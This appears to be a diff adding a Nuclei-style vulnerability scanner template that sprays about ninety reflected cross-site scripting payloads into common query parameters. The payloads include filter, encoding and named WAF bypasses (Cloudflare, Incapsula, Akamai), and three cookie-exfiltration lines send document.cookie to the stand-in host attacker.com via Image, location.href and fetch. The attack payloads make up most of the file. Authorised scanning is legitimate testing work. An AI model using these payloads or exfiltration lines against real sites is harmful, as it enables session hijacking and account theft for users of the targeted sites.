@@ -1,0 +1,256 @@
+id: xss-comprehensive
+
+info:
+  name: Comprehensive XSS Detection (All Vectors)
+  author: custom
+  severity: high
+  description: Comprehensive XSS template combining multiple bypass techniques, polyglots, WAF bypasses, and advanced payloads
+  tags: xss,comprehensive,polyglot,waf-bypass,filter-bypass,custom
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+variables:
+  random: "{{1}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q={{payload}}"
+      - "{{BaseURL}}?search={{payload}}"
+      - "{{BaseURL}}?param={{payload}}"
+      - "{{BaseURL}}?query={{payload}}"
+      - "{{BaseURL}}?keyword={{payload}}"
+      - "{{BaseURL}}?input={{payload}}"
+      - "{{BaseURL}}?name={{payload}}"
+      - "{{BaseURL}}?id={{payload}}"
+      - "{{BaseURL}}?url={{payload}}"
+      - "{{BaseURL}}?data={{payload}}"
+
+    payloads:
+      payload:
+        # Basic payloads
+        - '<script>alert({{random}})</script>'
+        - '<script>alert(document.domain)</script>'
+        - '<script>alert(document.cookie)</script>'
+        - '<scr<script>ipt>alert({{random}})</scr<script>ipt>'
+        - '"><script>alert({{random}})</script>'
+        - "'><script>alert({{random}})</script>"
+
+        # Case sensitivity bypass
+        - '<sCrIpt>alert({{random}})</ScRipt>'
+        - '<ScRiPt>alert({{random}})</sCrIpT>'
+
+        # Event handlers - IMG
+        - '<img src=x onerror=alert({{random}})>'
+        - '<img src=x onerror="alert({{random}})">'
+        - '<img src=x onerror=alert(String.fromCharCode(88,83,83))>'
+        - '<img src=x oneonerrorrror=alert({{random}})>'
+        - '<img src=x:alert(alt) onerror=eval(src) alt=xss>'
+        - '<img src=x onerror=alert(document.domain)//>'
+
+        # Event handlers - SVG
+        - '<svg onload=alert({{random}})>'
+        - '<svg/onload=alert({{random}})>'
+        - '<svg onload=alert({{random}})//>'
+        - '<svg/onload=alert(String.fromCharCode(88,83,83))>'
+        - '<svgonload=alert({{random}})>'
+        - '<svg id=alert({{random}}) onload=eval(id)>'
+        - '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>'
+        - '<svg><desc><![CDATA[</desc><script>alert({{random}})</script>]]></svg>'
+
+        # HTML5 tags
+        - '<body onload=alert({{random}})>'
+        - '<input autofocus onfocus=alert({{random}})>'
+        - '<select autofocus onfocus=alert({{random}})>'
+        - '<textarea autofocus onfocus=alert({{random}})>'
+        - '<video><source onerror="alert({{random}})"></video>'
+        - '<audio src onloadstart=alert({{random}})>'
+        - '<details/open/ontoggle="alert({{random}})">'
+        - '<marquee onstart=alert({{random}})>'
+
+        # Div with pointer events
+        - '<div onpointerover="alert({{random}})">HOVER</div>'
+        - '<div onpointerdown="alert({{random}})">CLICK</div>'
+
+        # Filter bypasses - String
+        - '<script>alert(String.fromCharCode(88,83,83))</script>'
+        - '<script>eval("ale"+"rt({{random}})")</script>'
+        - '<script>Function("ale"+"rt({{random}})")()</script>'
+        - '<script>setTimeout("alert({{random}})",0)</script>'
+
+        # Bypass quotes
+        - '<script>alert`{{random}}`</script>'
+        - '<script>setTimeout`alert\u0028{{random}}\u0029`</script>'
+
+        # Bypass parenthesis
+        - '<script>onerror=alert;throw {{random}}</script>'
+        - '<script>{onerror=alert}throw {{random}}</script>'
+
+        # Encoded payloads
+        - '%3Cscript%3Ealert({{random}})%3C%2Fscript%3E'
+        - '%253Cscript%253Ealert({{random}})%253C%252Fscript%253E'
+        - '<script>\u0061lert({{random}})</script>'
+        - '<script>eval("\x61lert({{random}})")</script>'
+
+        # HTML encoding
+        - '<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;({{random}})>'
+        - '<svg onload=&#97&#108&#101&#114&#00116&#40{{random}}&#41>'
+
+        # JavaScript wrappers
+        - 'javascript:alert({{random}})'
+        - 'javascript:alert(String.fromCharCode(88,83,83))'
+        - 'javascript://%0Aalert({{random}})'
+        - 'data:text/html,<script>alert({{random}})</script>'
+
+        # iframe injection
+        - '<iframe src="javascript:alert({{random}})"></iframe>'
+        - '<iframe src=javascript:alert({{random}})></iframe>'
+
+        # DOM XSS
+        - '#"><img src=/ onerror=alert({{random}})>'
+        - '<script%20id=x></script>#alert({{random}});//'
+
+        # Cookie exfiltration
+        - '<script>new Image().src="http://attacker.com?c="+document.cookie</script>'
+        - '<script>location.href="http://attacker.com?c="+document.cookie</script>'
+        - '<script>fetch("http://attacker.com",{method:"POST",body:document.cookie})</script>'
+
+        # Polyglot payloads
+        - "-->'\"</sCript><svG x=\">\" onload=(co\u006efirm)``>"
+        - '<svg%0Ao%00nload=%09((pro\u006dpt))({{random}})//>'
+        - '" onclick=alert({{random}})//<button onclick=alert({{random}})//> */ alert({{random}})//'
+
+        # WAF Bypasses - Cloudflare
+        - '<svg/onrandom=random onload=alert({{random}})>'
+        - '<video onnull=null onmouseover=alert({{random}})>'
+        - '<svg/OnLoad="`${prompt``}`">'
+        - '<svg/onload=%26nbsp;alert`{{random}}`>'
+
+        # WAF Bypasses - Incapsula
+        - '<svg onload\r\n=$.globalEval("al"+"ert({{random}})")>'
+        - '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>'
+
+        # WAF Bypasses - Akamai
+        - '<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a({{random}}) x>'
+
+        # Context breaking
+        - '</script><script>alert({{random}})</script>'
+        - '</title><script>alert({{random}})</script>'
+        - '</textarea><script>alert({{random}})</script>'
+        - '"></script><svg onload=alert({{random}})>'
+
+        # Advanced bypasses
+        - '<script x>alert({{random}})</script>'
+        - "<img src='1' onerror='alert({{random}})' <"
+        - '<a href="" onmousedown="var name = ''&#39;;alert({{random}})//''; alert(''x'')">Link</a>'
+        - "<script>window['alert']({{random}})</script>"
+        - '<script>eval(atob("YWxlcnQoMSk="))</script>'
+
+        # Space bypasses
+        - '<svg/onload=alert({{random}})>'
+        - '<img/src=x/onerror=alert({{random}})>'
+        - '<iframe/src=javascript:alert({{random}})>'
+
+        # Uppercase output bypass
+        - '<IMG SRC=X ONERROR=ALERT({{random}})>'
+
+        # Hidden input
+        - '<input type="hidden" oncontentvisibilityautostatechange="alert({{random}})" style="content-visibility:auto">'
+
+        # JS context
+        - '-(confirm)({{random}})//'
+        - '; alert({{random}});//'
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: reflected-script-tag
+        dsl:
+          - 'contains(body, "<script")'
+          - 'contains(body, "alert(")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: reflected-event-handler
+        dsl:
+          - 'regex("on(load|error|click|mouseover|focus|toggle|start|pointer)", body)'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: reflected-svg-tag
+        dsl:
+          - 'contains(body, "<svg")'
+          - 'contains(body, "onload")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: reflected-img-tag
+        dsl:
+          - 'contains(body, "<img")'
+          - 'contains(body, "onerror")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: reflected-iframe
+        dsl:
+          - 'contains(body, "<iframe")'
+          - 'contains(body, "javascript:")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: javascript-wrapper
+        dsl:
+          - 'contains(body, "javascript:")'
+          - 'contains(body, "alert")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: polyglot-reflection
+        dsl:
+          - 'contains(body, "oNcliCk")'
+          - 'contains(body, "oNloAd")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: html5-tags
+        dsl:
+          - 'regex("(details|marquee|video|audio|input|select|textarea)", body)'
+          - 'regex("(autofocus|onfocus|ontoggle|onstart)", body)'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: context-breaking
+        dsl:
+          - 'contains(body, "</script>")'
+          - 'contains(body, "</title>")'
+          - 'contains(body, "</textarea>")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: encoded-payload
+        dsl:
+          - 'contains(body, "&#")'
+          - 'contains(body, "alert")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
